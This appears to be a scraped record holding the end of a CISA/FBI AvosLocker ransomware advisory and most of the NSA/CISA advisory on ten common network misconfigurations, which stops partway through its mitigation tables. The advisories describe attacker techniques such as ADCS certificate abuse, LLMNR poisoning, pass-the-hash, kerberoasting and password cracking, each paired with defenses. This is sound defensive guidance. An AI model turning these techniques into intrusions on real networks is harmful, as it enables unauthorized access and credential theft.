Identify, detect, and investigate abnormal activity and potential traversal of the indicated ransomware with a networking monitoring tool. To aid in detecting ransomware, implement a tool that logs and reports all network traffic, including lateral movement activity on a network. Endpoint detection and response (EDR) tools are particularly useful for detecting lateral connections, as they have insight into common and uncommon network connections for each host,CPG 3.A,.
Install, regularly update, and enable real time detection for antivirus software on all hosts.
Disable unused ports,CPG 2.V,.
Consider adding an email banner to emails received from outside your organization,CPG 2.M,.
Ensure all backup data is encrypted, immutable (i.e., cannot be altered or deleted), and covers the entire organization’s data infrastructure,CPG 2.K, 2.L, 2.R,.

VALIDATE SECURITY CONTROLS
In addition to applying mitigations, FBI and CISA recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. FBI and CISA recommend testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.
To get started:

Select an ATT&CK technique described in this advisory (see Tables 3-7).
Align your security technologies against the technique.
Test your technologies against the technique.
Analyze your detection and prevention technologies’ performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program, including people, processes, and technologies, based on the data generated by this process.

FBI and CISA recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.
RESOURCES

Stopransomware.gov is a whole-of-government approach that gives one central location for ransomware resources and alerts.
The Joint Ransomware Guide provides preparation, prevention, and mitigation best practices as well as a ransomware response checklist.
Cyber Hygiene Services and Ransomware Readiness Assessment provide no-cost cyber hygiene and ransomware readiness assessment services.

REPORTING
The FBI is seeking any information that can be shared, to include boundary logs showing communication to and from foreign IP addresses, a sample ransom note, communications with AvosLocker affiliates, Bitcoin wallet information, decryptor files, and/or a benign sample of an encrypted file. The FBI and CISA do not encourage paying ransom as payment does not guarantee victim files will be recovered. Furthermore, payment may also embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities. Regardless of whether you or your organization have decided to pay the ransom, the FBI and CISA urge you to promptly report ransomware incidents to the FBI Internet Crime Complaint Center (IC3) at ic3.gov, local FBI Field Office, or CISA via the agency’s Incident Reporting System or its 24/7 Operations Center at report@cisa.gov or by calling 1-844-Say-CISA (1-844-729-2472).
DISCLAIMER
The information in this report is being provided “as is” for informational purposes only. CISA and  FBI do not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by CISA and FBI.
REFERENCES,1, GitHub sysdream | ligolo repository,2, GitHub jpillora | chisel repository,3, GitHub BishopFox | sliver repository






This product is provided subject to this Notification and this Privacy & Use policy.


",https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-284a
16,"



A plea for network defenders and software manufacturers to fix common problems.
EXECUTIVE SUMMARY
The National Security Agency (NSA) and Cybersecurity and Infrastructure Security Agency (CISA) are releasing this joint cybersecurity advisory (CSA) to highlight the most common cybersecurity misconfigurations in large organizations, and detail the tactics, techniques, and procedures (TTPs) actors use to exploit these misconfigurations.
Through NSA and CISA Red and Blue team assessments, as well as through the activities of NSA and CISA Hunt and Incident Response teams, the agencies identified the following 10 most common network misconfigurations:

Default configurations of software and applications
Improper separation of user/administrator privilege
Insufficient internal network monitoring
Lack of network segmentation
Poor patch management
Bypass of system access controls
Weak or misconfigured multifactor authentication (MFA) methods
Insufficient access control lists (ACLs) on network shares and services
Poor credential hygiene
Unrestricted code execution

These misconfigurations illustrate (1) a trend of systemic weaknesses in many large organizations, including those with mature cyber postures, and (2) the importance of software manufacturers embracing secure-by-design principles to reduce the burden on network defenders:

Properly trained, staffed, and funded network security teams can implement the known mitigations for these weaknesses.
Software manufacturers must reduce the prevalence of these misconfigurations—thus strengthening the security posture for customers—by incorporating secure-by-design and -default principles and tactics into their software development practices.[1]

NSA and CISA encourage network defenders to implement the recommendations found within the Mitigations section of this advisory—including the following—to reduce the risk of malicious actors exploiting the identified misconfigurations.

Remove default credentials and harden configurations.
Disable unused services and implement access controls.
Update regularly and automate patching, prioritizing patching of known exploited vulnerabilities.[2]
Reduce, restrict, audit, and monitor administrative accounts and privileges.

NSA and CISA urge software manufacturers to take ownership of improving security outcomes of their customers by embracing secure-by-design and-default tactics, including:

Embedding security controls into product architecture from the start of development and throughout the entire software development lifecycle (SDLC).
Eliminating default passwords.
Providing high-quality audit logs to customers at no extra charge.
Mandating MFA, ideally phishing-resistant, for privileged users and making MFA a default rather than opt-in feature.[3]

Download the PDF version of this report: PDF, 660 KB
TECHNICAL DETAILS
Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 13, and the MITRE D3FEND™ cybersecurity countermeasures framework.[4],[5] See the Appendix: MITRE ATT&CK tactics and techniques section for tables summarizing the threat actors’ activity mapped to MITRE ATT&CK tactics and techniques, and the Mitigations section for MITRE D3FEND countermeasures.
For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool.[6],[7]
Overview
Over the years, the following NSA and CISA teams have assessed the security posture of many network enclaves across the Department of Defense (DoD); Federal Civilian Executive Branch (FCEB); state, local, tribal, and territorial (SLTT) governments; and the private sector:

Depending on the needs of the assessment, NSA Defensive Network Operations (DNO) teams feature capabilities from Red Team (adversary emulation), Blue Team (strategic vulnerability assessment), Hunt (targeted hunt), and/or Tailored Mitigations (defensive countermeasure development).
CISA Vulnerability Management (VM) teams have assessed the security posture of over 1,000 network enclaves. CISA VM teams include Risk and Vulnerability Assessment (RVA) and CISA Red Team Assessments (RTA).[8] The RVA team conducts remote and onsite assessment services, including penetration testing and configuration review. RTA emulates cyber threat actors in coordination with an organization to assess the organization’s cyber detection and response capabilities.
CISA Hunt and Incident Response teams conduct proactive and reactive engagements, respectively, on organization networks to identify and detect cyber threats to U.S. infrastructure.

During these assessments, NSA and CISA identified the 10 most common network misconfigurations, which are detailed below. These misconfigurations (non-prioritized) are systemic weaknesses across many networks.
Many of the assessments were of Microsoft® Windows® and Active Directory® environments. This advisory provides details about, and mitigations for, specific issues found during these assessments, and so mostly focuses on these products. However, it should be noted that many other environments contain similar misconfigurations. Network owners and operators should examine their networks for similar misconfigurations even when running other software not specifically mentioned below.
1. Default Configurations of Software and Applications
Default configurations of systems, services, and applications can permit unauthorized access or other malicious activity. Common default configurations include:

Default credentials
Default service permissions and configurations settings

Default Credentials
Many software manufacturers release commercial off-the-shelf (COTS) network devices —which provide user access via applications or web portals—containing predefined default credentials for their built-in administrative accounts.[9] Malicious actors and assessment teams regularly abuse default credentials by:

Finding credentials with a simple web search [T1589.001] and using them [T1078.001] to gain authenticated access to a device.
Resetting built-in administrative accounts [T1098] via predictable forgotten passwords questions.
Leveraging default virtual private network (VPN) credentials for internal network access [T1133].
Leveraging publicly available setup information to identify built-in administrative credentials for web applications and gaining access to the application and its underlying database.
Leveraging default credentials on software deployment tools [T1072] for code execution and lateral movement.

In addition to devices that provide network access, printers, scanners, security cameras, conference room audiovisual (AV) equipment, voice over internet protocol (VoIP) phones, and internet of things (IoT) devices commonly contain default credentials that can be used for easy unauthorized access to these devices as well. Further compounding this problem, printers and scanners may have privileged domain accounts loaded so that users can easily scan documents and upload them to a shared drive or email them. Malicious actors who gain access to a printer or scanner using default credentials can use the loaded privileged domain accounts to move laterally from the device and compromise the domain [T1078.002].
Default Service Permissions and Configuration Settings
Certain services may have overly permissive access controls or vulnerable configurations by default. Additionally, even if the providers do not enable these services by default, malicious actors can easily abuse these services if users or administrators enable them.
Assessment teams regularly find the following:

Insecure Active Directory Certificate Services
Insecure legacy protocols/services
Insecure Server Message Block (SMB) service

Insecure Active Directory Certificate Services
Active Directory Certificate Services (ADCS) is a feature used to manage Public Key Infrastructure (PKI) certificates, keys, and encryption inside of Active Directory (AD) environments. ADCS templates are used to build certificates for different types of servers and other entities on an organization’s network.
Malicious actors can exploit ADCS and/or ADCS template misconfigurations to manipulate the certificate infrastructure into issuing fraudulent certificates and/or escalate user privileges to domain administrator privileges. These certificates and domain escalation paths may grant actors unauthorized, persistent access to systems and critical data, the ability to impersonate legitimate entities, and the ability to bypass security measures.
Assessment teams have observed organizations with the following misconfigurations:

ADCS servers running with web-enrollment enabled. If web-enrollment is enabled, unauthenticated actors can coerce a server to authenticate to an actor-controlled computer, which can relay the authentication to the ADCS web-enrollment service and obtain a certificate [T1649] for the server’s account. These fraudulent, trusted certificates enable actors to use adversary-in-the-middle techniques [T1557] to masquerade as trusted entities on the network. The actors can also use the certificate for AD authentication to obtain a Kerberos Ticket Granting Ticket (TGT) [T1558.001], which they can use to compromise the server and usually the entire domain.
ADCS templates where low-privileged users have enrollment rights, and the enrollee supplies a subject alternative name. Misconfiguring various elements of ADCS templates can result in domain escalation by unauthorized users (e.g., granting low-privileged users certificate enrollment rights, allowing requesters to specify a subjectAltName in the certificate signing request [CSR], not requiring authorized signatures for CSRs, granting FullControl or WriteDacl permissions to users). Malicious actors can use a low-privileged user account to request a certificate with a particular Subject Alternative Name (SAN) and gain a certificate where the SAN matches the User Principal Name (UPN) of a privileged account.

Note: For more information on known escalation paths, including PetitPotam NTLM relay techniques, see: Domain Escalation: PetitPotam NTLM Relay to ADCS Endpoints and Certified Pre-Owned, Active Directory Certificate Services.[10],[11],[12]
Insecure legacy protocols/services
Many vulnerable network services are enabled by default, and assessment teams have observed them enabled in production environments. Specifically, assessment teams have observed Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS), which are Microsoft Windows components that serve as alternate methods of host identification. If these services are enabled in a network, actors can use spoofing, poisoning, and relay techniques [T1557.001] to obtain domain hashes, system access, and potential administrative system sessions. Malicious actors frequently exploit these protocols to compromise entire Windows’ environments.
Malicious actors can spoof an authoritative source for name resolution on a target network by responding to passing traffic, effectively poisoning the service so that target computers will communicate with an actor-controlled system instead of the intended one. If the requested system requires identification/authentication, the target computer will send the user’s username and hash to the actor-controlled system. The actors then collect the hash and crack it offline to obtain the plain text password [T1110.002].
Insecure Server Message Block (SMB) service
The Server Message Block service is a Windows component primarily for file sharing. Its default configuration, including in the latest version of Windows, does not require signing network messages to ensure authenticity and integrity. If SMB servers do not enforce SMB signing, malicious actors can use machine-in-the-middle techniques, such as NTLM relay. Further, malicious actors can combine a lack of SMB signing with the name resolution poisoning issue (see above) to gain access to remote systems [T1021.002] without needing to capture and crack any hashes.
2. Improper Separation of User/Administrator Privilege
Administrators often assign multiple roles to one account. These accounts have access to a wide range of devices and services, allowing malicious actors to move through a network quickly with one compromised account without triggering lateral movement and/or privilege escalation detection measures.
Assessment teams have observed the following common account separation misconfigurations:

Excessive account privileges
Elevated service account permissions
Non-essential use of elevated accounts

Excessive Account Privileges
Account privileges are intended to control user access to host or application resources to limit access to sensitive information or enforce a least-privilege security model. When account privileges are overly permissive, users can see and/or do things they should not be able to, which becomes a security issue as it increases risk exposure and attack surface.
Expanding organizations can undergo numerous changes in account management, personnel, and access requirements. These changes commonly lead to privilege creep—the granting of excessive access and unnecessary account privileges. Through the analysis of topical and nested AD groups, a malicious actor can find a user account [T1078] that has been granted account privileges that exceed their need-to-know or least-privilege function. Extraneous access can lead to easy avenues for unauthorized access to data and resources and escalation of privileges in the targeted domain.
Elevated Service Account Permissions
Applications often operate using user accounts to access resources. These user accounts, which are known as service accounts, often require elevated privileges. When a malicious actor compromises an application or service using a service account, they will have the same privileges and access as the service account.
Malicious actors can exploit elevated service permissions within a domain to gain unauthorized access and control over critical systems. Service accounts are enticing targets for malicious actors because such accounts are often granted elevated permissions within the domain due to the nature of the service, and because access to use the service can be requested by any valid domain user. Due to these factors, kerberoasting—a form of credential access achieved by cracking service account credentials—is a common technique used to gain control over service account targets [T1558.003].
Non-Essential Use of Elevated Accounts
IT personnel use domain administrator and other administrator accounts for system and network management due to their inherent elevated privileges. When an administrator account is logged into a compromised host, a malicious actor can steal and use the account's credentials and an AD-generated authentication token [T1528] to move, using the elevated permissions, throughout the domain [T1550.001]. Using an elevated account for normal day-to-day, non-administrative tasks increases the account’s exposure and, therefore, its risk of compromise and its risk to the network.
Malicious actors prioritize obtaining valid domain credentials upon gaining access to a network. Authentication using valid domain credentials allows the execution of secondary enumeration techniques to gain visibility into the target domain and AD structure, including discovery of elevated accounts and where the elevated accounts are used [T1087].
Targeting elevated accounts (such as domain administrator or system administrators) performing day-to-day activities provides the most direct path to achieve domain escalation. Systems or applications accessed by the targeted elevated accounts significantly increase the attack surface available to adversaries, providing additional paths and escalation options.
After obtaining initial access via an account with administrative permissions, an assessment team compromised a domain in under a business day. The team first gained initial access to the system through phishing [T1566], by which they enticed the end user to download [T1204] and execute malicious payloads. The targeted end-user account had administrative permissions, enabling the team to quickly compromise the entire domain.
3. Insufficient Internal Network Monitoring
Some organizations do not optimally configure host and network sensors for traffic collection and end-host logging. These insufficient configurations could lead to undetected adversarial compromise. Additionally, improper sensor configurations limit the traffic collection capability needed for enhanced baseline development and detract from timely detection of anomalous activity.
Assessment teams have exploited insufficient monitoring to gain access to assessed networks. For example:

An assessment team observed an organization with host-based monitoring, but no network monitoring. Host-based monitoring informs defensive teams about adverse activities on singular hosts and network monitoring informs about adverse activities traversing hosts [TA0008]. In this example, the organization could identify infected hosts but could not identify where the infection was coming from, and thus could not stop future lateral movement and infections.
An assessment team gained persistent deep access to a large organization with a mature cyber posture. The organization did not detect the assessment team’s lateral movement, persistence, and command and control (C2) activity, including when the team attempted noisy activities to trigger a security response. For more information on this activity, see CSA CISA Red Team Shares Key Findings to Improve Monitoring and Hardening of Networks.[13]

4. Lack of Network Segmentation
Network segmentation separates portions of the network with security boundaries. Lack of network segmentation leaves no security boundaries between the user, production, and critical system networks. Insufficient network segmentation allows an actor who has compromised a resource on the network to move laterally across a variety of systems uncontested. Lack of network segregation additionally leaves organizations significantly more vulnerable to potential ransomware attacks and post-exploitation techniques.
Lack of segmentation between IT and operational technology (OT) environments places OT environments at risk. For example, assessment teams have often gained access to OT networks—despite prior assurance that the networks were fully air gapped, with no possible connection to the IT network—by finding special purpose, forgotten, or even accidental network connections [T1199].
5. Poor Patch Management
Vendors release patches and updates to address security vulnerabilities. Poor patch management and network hygiene practices often enable adversaries to discover open attack vectors and exploit critical vulnerabilities. Poor patch management includes:

Lack of regular patching
Use of unsupported operating systems (OSs) and outdated firmware

Lack of Regular Patching
Failure to apply the latest patches can leave a system open to compromise from publicly available exploits. Due to their ease of discovery—via vulnerability scanning [T1595.002] and open source research [T1592]—and exploitation, these systems are immediate targets for adversaries. Allowing critical vulnerabilities to remain on production systems without applying their corresponding patches significantly increases the attack surface. Organizations should prioritize patching known exploited vulnerabilities in their environments.[2]
Assessment teams have observed threat actors exploiting many CVEs in public-facing applications [T1190], including:

CVE-2019-18935 in an unpatched instance of Telerik® UI for ASP.NET running on a Microsoft IIS server.[14]
CVE-2021-44228 (Log4Shell) in an unpatched VMware® Horizon server.[15]
CVE-2022-24682, CVE-2022-27924, and CVE-2022-27925 chained with CVE-2022-37042, or CVE-2022-30333 in an unpatched Zimbra® Collaboration Suite.[16]

Use of Unsupported OSs and Outdated Firmware
Using software or hardware that is no longer supported by the vendor poses a significant security risk because new and existing vulnerabilities are no longer patched. Malicious actors can exploit vulnerabilities in these systems to gain unauthorized access, compromise sensitive data, and disrupt operations [T1210].
Assessment teams frequently observe organizations using unsupported Windows operating systems without updates MS17-010 and MS08-67. These updates, released years ago, address critical remote code execution vulnerabilities.[17],[18]
6. Bypass of System Access Controls
A malicious actor can bypass system access controls by compromising alternate authentication methods in an environment. If a malicious actor can collect hashes in a network, they can use the hashes to authenticate using non-standard means, such as pass-the-hash (PtH) [T1550.002]. By mimicking accounts without the clear-text password, an actor can expand and fortify their access without detection. Kerberoasting is also one of the most time-efficient ways to elevate privileges and move laterally throughout an organization’s network.
7. Weak or Misconfigured MFA Methods
Misconfigured Smart Cards or Tokens
Some networks (generally government or DoD networks) require accounts to use smart cards or tokens. Multifactor requirements can be misconfigured so the password hashes for accounts never change. Even though the password itself is no longer used—because the smart card or token is required instead—there is still a password hash for the account that can be used as an alternative credential for authentication. If the password hash never changes, once a malicious actor has an account’s password hash [T1111], the actor can use it indefinitely, via the PtH technique for as long as that account exists.
Lack of Phishing-Resistant MFA
Some forms of MFA are vulnerable to phishing, “push bombing” [T1621], exploitation of Signaling System 7 (SS7) protocol vulnerabilities, and/or “SIM swap” techniques. These attempts, if successful, may allow a threat actor to gain access to MFA authentication credentials or bypass MFA and access the MFA-protected systems. (See CISA’s Fact Sheet Implementing Phishing-Resistant MFA for more information.)[3]
For example, assessment teams have used voice phishing to convince users to provide missing MFA information [T1598]. In one instance, an assessment team knew a user’s main credentials, but their login attempts were blocked by MFA requirements. The team then masqueraded as IT staff and convinced the user to provide the MFA code over the phone, allowing the team to complete their login attempt and gain access to the user’s email and other organizational resources.
8. Insufficient ACLs on Network Shares and Services
Data shares and repositories are primary targets for malicious actors. Network administrators may improperly configure ACLs to allow for unauthorized users to access sensitive or administrative data on shared drives.
Actors can use commands, open source tools, or custom malware to look for shared folders and drives [T1135].

In one compromise, a team observed actors use the net share command—which displays information about shared resources on the local computer—and the ntfsinfo command to search network shares on compromised computers. In the same compromise, the actors used a custom tool, CovalentStealer, which is designed to identify file shares on a system, categorize the files [T1083], and upload the files to a remote server [TA0010].[19],[20]
Ransomware actors have used the SoftPerfect® Network Scanner, netscan.exe—which can ping computers [T1018], scan ports [T1046], and discover shared folders—and SharpShares to enumerate accessible network shares in a domain.[21],[22]

Malicious actors can then collect and exfiltrate the data from the shared drives and folders. They can then use the data for a variety of purposes, such as extortion of the organization or as intelligence when formulating intrusion plans for further network compromise. Assessment teams routinely find sensitive information on network shares [T1039] that could facilitate follow-on activity or provide opportunities for extortion. Teams regularly find drives containing cleartext credentials [T1552] for service accounts, web applications, and even domain administrators.
Even when further access is not directly obtained from credentials in file shares, there can be a treasure trove of information for improving situational awareness of the target network, including the network’s topology, service tickets, or vulnerability scan data. In addition, teams regularly identify sensitive data and PII on shared drives (e.g., scanned documents, social security numbers, and tax returns) that could be used for extortion or social engineering of the organization or individuals.
9. Poor Credential Hygiene
Poor credential hygiene facilitates threat actors in obtaining credentials for initial access, persistence, lateral movement, and other follow-on activity, especially if phishing-resistant MFA is not enabled. Poor credential hygiene includes:

Easily crackable passwords
Cleartext password disclosure

Easily Crackable Passwords
Easily crackable passwords are passwords that a malicious actor can guess within a short time using relatively inexpensive computing resources. The presence of easily crackable passwords on a network generally stems from a lack of password length (i.e., shorter than 15 characters) and randomness (i.e., is not unique or can be guessed). This is often due to lax requirements for passwords in organizational policies and user training. A policy that only requires short and simple passwords leaves user passwords susceptible to password cracking. Organizations should provide or allow employee use of password managers to enable the generation and easy use of secure, random passwords for each account.
Often, when a credential is obtained, it is a hash (one-way encryption) of the password and not the password itself. Although some hashes can be used directly with PtH techniques, many hashes need to be cracked to obtain usable credentials. The cracking process takes the captured hash of the user’s plaintext password and leverages dictionary wordlists and rulesets, often using a database of billions of previously compromised passwords, in an attempt to find the matching plaintext password [T1110.002].
One of the primary ways to crack passwords is with the open source tool, Hashcat, combined with password lists obtained from publicly released password breaches. Once a malicious actor has access to a plaintext password, they are usually limited only by the account’s permissions. In some cases, the actor may be restricted or detected by advanced defense-in-depth and zero trust implementations as well, but this has been a rare finding in assessments thus far.
Assessment teams have cracked password hashes for NTLM users, Kerberos service account tickets, NetNTLMv2, and PFX stores [T1555], enabling the team to elevate privileges and move laterally within networks. In 12 hours, one team cracked over 80% of all users' passwords in an Active Directory, resulting in hundreds of valid credentials.
Cleartext Password Disclosure
Storing passwords in cleartext is a serious security risk. A malicious actor with access to files containing cleartext passwords [T1552.001] could use these credentials to log into the affected applications or systems under the guise of a legitimate user. Accountability is lost in this situation as any system logs would record valid user accounts accessing applications or systems.
Malicious actors search for text files, spreadsheets, documents, and configuration files in hopes of obtaining cleartext passwords. Assessment teams frequently discover cleartext passwords, allowing them to quickly escalate the emulated intrusion from the compromise of a regular domain user account to that of a privileged account, such as a Domain or Enterprise Administrator. A common tool used for locating cleartext passwords is the open source tool, Snaffler.[23]
10. Unrestricted Code Execution
If unverified programs are allowed to execute on hosts, a threat actor can run arbitrary, malicious payloads within a network.
Malicious actors often execute code after gaining initial access to a system. For example, after a user falls for a phishing scam, the actor usually convinces the victim to run code on their workstation to gain remote access to the internal network. This code is usually an unverified program that has no legitimate purpose or business reason for running on the network.
Assessment teams and malicious actors frequently leverage unrestricted code execution in the form of executables, dynamic link libraries (DLLs), HTML applications, and macros (scripts used in office automation documents) [T1059.005] to establish initial access, persistence, and lateral movement. In addition, actors often use scripting languages [T1059] to obscure their actions [T1027.010] and bypass allowlisting—where organizations restrict applications and other forms of code by default and only allow those that are known and trusted. Further, actors may load vulnerable drivers and then exploit the drivers’ known vulnerabilities to execute code in the kernel with the highest level of system privileges to completely compromise the device [T1068].
MITIGATIONS
Network Defenders
NSA and CISA recommend network defenders implement the recommendations that follow to mitigate the issues identified in this advisory. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST) as well as with the MITRE ATT&CK Enterprise Mitigations and MITRE D3FEND frameworks.
The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s Cross-Sector Cybersecurity Performance Goals for more information on the CPGs, including additional recommended baseline protections.[24]
Mitigate Default Configurations of Software and Applications

Table 1: Recommendations for Network Defenders to Mitigate Default Configurations of Software and Applications


Misconfiguration
Recommendations for Network Defenders




Default configurations of software and applications


Modify the default configuration of applications and appliances before deployment in a production environment [M1013],[D3-ACH]. Refer to hardening guidelines provided by the vendor and related cybersecurity guidance (e.g., DISA's Security Technical Implementation Guides (STIGs) and configuration guides).[25],[26],[27]




Default configurations of software and applications: Default Credentials


Change or disable vendor-supplied default usernames and passwords of services, software, and equipment when installing or commissioning [CPG 2.A]. When resetting passwords, enforce the use of “strong” passwords (i.e., passwords that are more than 15 characters and random [CPG 2.B]) and follow hardening guidelines provided by the vendor, STIGs, NSA, and/or NIST [M1027],[D3-SPP].[25],[26],[28],[29]




Default service permissions and configuration settings: Insecure Active Directory Certificate Services


Ensure the secure configuration of ADCS implementations. Regularly update and patch the controlling infrastructure (e.g., for CVE-2021-36942), employ monitoring and auditing mechanisms, and implement strong access controls to protect the infrastructure.

If not needed, disable web-enrollment in ADCS servers. See Microsoft: Uninstall-AdcsWebEnrollment (ADCSDeployment) for guidance.[30]
If web enrollment is needed on ADCS servers:

Enable Extended Protection for Authentication (EPA) for Client Authority Web Enrollment. This is done by choosing the “Required” option. For guidance, see Microsoft: KB5021989: Extended Protection for Authentication.[31]
Enable “Require SSL” on the ADCS server.


Disable NTLM on all ADCS servers. For guidance, see Microsoft: Network security Restrict NTLM in this domain - Windows Security | Microsoft Learn and Network security Restrict NTLM Incoming NTLM traffic - Windows Security.[32],[33]
Disable SAN for UPN Mapping. For guidance see, Microsoft: How to disable the SAN for UPN mapping - Windows Server. Instead, smart card authentication can use the altSecurityIdentities attribute for explicit mapping of certificates to accounts more securely.[34]


Review all permissions on the ADCS templates on applicable servers. Restrict enrollment rights to only those users or groups that require it. Disable the CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT flag from templates to prevent users from supplying and editing sensitive security settings within these templates. Enforce manager approval for requested certificates. Remove FullControl, WriteDacl, and Write property permissions from low-privileged groups, such as domain users, to certificate template objects.




Default service permissions and configuration settings: Insecure legacy protocols/services


Determine if LLMNR and NetBIOS are required for essential business operations.

If not required, disable LLMNR and NetBIOS in local computer security settings or by group policy.






Default service permissions and configuration settings: Insecure SMB service


Require SMB signing for both SMB client and server on all systems.[25] This should prevent certain adversary-in-the-middle and pass-the-hash techniques. For more information on SMB signing, see Microsoft: Overview of Server Message Block Signing. [35] Note: Beginning in Microsoft Windows 11 Insider Preview Build 25381, Windows requires SMB signing for all communications.[36]





Mitigate Improper Separation of User/Administrator Privilege

Table 2: Recommendations for Network Defenders to Mitigate Improper Separation of User/Administrator Privilege


Misconfiguration
Recommendations for Network Defenders





Improper separation of user/administrator privilege:

Excessive account privileges,
Elevated service account permissions, and
Non-essential use of elevated accounts




Implement authentication, authorization, and accounting (AAA) systems [M1018] to limit actions users can perform, and review logs of user actions to detect unauthorized use and abuse. Apply least privilege principles to user accounts and groups allowing only the performance of authorized actions.
Audit user accounts and remove those that are inactive or unnecessary on a routine basis [CPG 2.D]. Limit the ability for user accounts to create additional accounts.
Restrict use of privileged accounts to perform general tasks, such as accessing emails and browsing the Internet [CPG 2.E],[D3-UAP]. See NSA Cybersecurity Information Sheet (CSI) Defend Privileges and Accounts for more information.[37]
Limit the number of users within the organization with an identity and access management (IAM) role that has administrator privileges. Strive to reduce all permanent privileged role assignments, and conduct periodic entitlement reviews on IAM users, roles, and policies.
Implement time-based access for privileged accounts. For example, the just-in-time access method provisions privileged access when needed and can support enforcement of the principle of least privilege (as well as the Zero Trust model) by setting network-wide policy to automatically disable admin accounts at the Active Directory level. As needed, individual users can submit requests through an automated process that enables access to a system for a set timeframe. In cloud environments, just-in-time elevation is also appropriate and may be implemented using per-session federated claims or privileged access management tools.
Restrict domain users from being in the local administrator group on multiple systems.
Run daemonized applications (services) with non-administrator accounts when possible.
Only configure service accounts with the permissions necessary for the services they control to operate.
Disable unused services and implement ACLs to protect services.





Mitigate Insufficient Internal Network Monitoring

Table 3: Recommendations for Network Defenders to Mitigate Insufficient Internal Network Monitoring


Misconfiguration
Recommendations for Network Defenders




Insufficient internal network monitoring


Establish a baseline of applications and services, and routinely audit their access and use, especially for administrative activity [D3-ANAA]. For instance, administrators should routinely audit the access lists and permissions for of all web applications and services [CPG 2.O],[M1047]. Look for suspicious accounts, investigate them, and remove accounts and credentials, as appropriate, such as accounts of former staff.[39]
Establish a baseline that represents an organization’s normal traffic activity, network performance, host application activity, and user behavior; investigate any deviations from that baseline [D3-NTCD],[D3-CSPP],[D3-UBA].[40]
Use auditing tools capable of detecting privilege and service abuse opportunities on systems within an enterprise and correct them [M1047].
Implement a security information and event management (SIEM) system to provide log aggregation, correlation, querying, visualization, and alerting from network endpoints, logging systems, endpoint and detection response (EDR) systems and intrusion detection systems (IDS) [CPG 2.T],[D3-NTA].





Mitigate Lack of Network Segmentation

Table 4: Recommendations for Network Defenders to Mitigate Lack of Network Segmentation


Misconfiguration
Recommendations for Network Defenders




Lack of network segmentation


Implement next-generation firewalls to perform deep packet filtering, stateful inspection, and application-level packet inspection [D3-NTF]. Deny or drop improperly formatted traffic that is incongruent with application-specific traffic permitted on the network. This practice limits an actor’s ability to abuse allowed application protocols. The practice of allowlisting network applications does not rely on generic ports as filtering criteria, enhancing filtering fidelity. For more information on application-aware defenses, see NSA CSI Segment Networks and Deploy Application-Aware Defenses.[41]
Engineer network segments to isolate critical systems, functions, and resources [CPG 2.F],[D3-NI]. Establish physical and logical segmentation controls, such as virtual local area network (VLAN) configurations and properly configured access control lists (ACLs) on infrastructure devices [M1030]. These devices should be baselined and audited to prevent access to potentially sensitive systems and information. Leverage properly configured Demilitarized Zones (DMZs) to reduce service exposure to the Internet.[42],[43],[44]
Implement separate Virtual Private Cloud (VPC) instances to isolate essential cloud systems. Where possible, implement Virtual Machines (VM) and Network Function Virtualization (NFV) to enable micro-segmentation of networks in virtualized environments and cloud data centers. Employ secure VM firewall configurations in tandem with macro segmentation.





Mitigate Poor Patch Management

Table 5: Recommendations for Network Defenders to Mitigate Poor Patch Management


Misconfiguration
Recommendations for Network Defenders




Poor patch management: Lack of regular patching


Ensure organizations implement and maintain an efficient patch management process that enforces the use of up-to-date, stable versions of OSs, browsers, and software [M1051],[D3-SU].[45]
Update software regularly by employing patch management for externally exposed applications, internal enterprise endpoints, and servers. Prioritize patching known exploited vulnerabilities.[2]
Automate the update process as much as possible and use vendor-provided updates. Consider using automated patch management tools and software update tools.
Where patching is not possible due to limitations, segment networks to limit exposure of the vulnerable system or host.




Poor patch management: Use of unsupported OSs and outdated firmware


Evaluate the use of unsupported hardware and software and discontinue use as soon as possible. If discontinuing is not possible, implement additional network protections to mitigate the risk.[45]
Patch the Basic Input/Output System (BIOS) and other firmware to prevent exploitation of known vulnerabilities.





Mitigate Bypass of System Access Controls

Table 6: Recommendations for Network Defenders to Mitigate Bypass of System Access Controls


Misconfiguration
Recommendations for Network Defenders




Bypass of system access controls


Limit credential overlap across systems to prevent credential compromise and reduce a malicious actor's ability to move laterally between systems [M1026],[D3-CH]. Implement a method for monitoring non-standard logon events through host log monitoring [CPG 2.G].
Implement an effective and routine patch management process. Mitigate PtH techniques by applying patch KB2871997 to Windows 7 and newer versions to limit default access of accounts in the local administrator group [M1051],[D3-SU].[46]
Enable the PtH mitigations to apply User Account Control (UAC) restrictions to local accounts upon network logon [M1052],[D3-UAP].
Deny domain users the ability to be in the local administrator group on multiple systems [M1018],[D3-UAP].
Limit workstation-to-workstation communications. All workstation communications should occur through a server to prevent lateral movement [M1018],[D3-UAP].
Use privileged accounts only on systems requiring those privileges [M1018],[D3-UAP]. Consider using dedicated Privileged Access Workstations for privileged accounts to better isolate and protect them.[37]





Mitigate Weak or Misconfigured MFA Methods

Table 7: Recommendations for Network Defenders to Mitigate Weak or Misconfigured MFA Methods


Misconfiguration
Recommendations for Network Defenders





Weak or misconfigured MFA methods: Misconfigured smart cards or tokens
 



In Windows environments:

Disable the use of New Technology LAN Manager (NTLM) and other legacy authentication protocols that are susceptible to PtH due to their use of password hashes [M1032],[D3-MFA]. For guidance, see Microsoft: Network security Restrict NTLM in this domain - Windows Security | Microsoft Learn and Network security Restrict NTLM Incoming NTLM traffic - Windows Security.[32],[33]
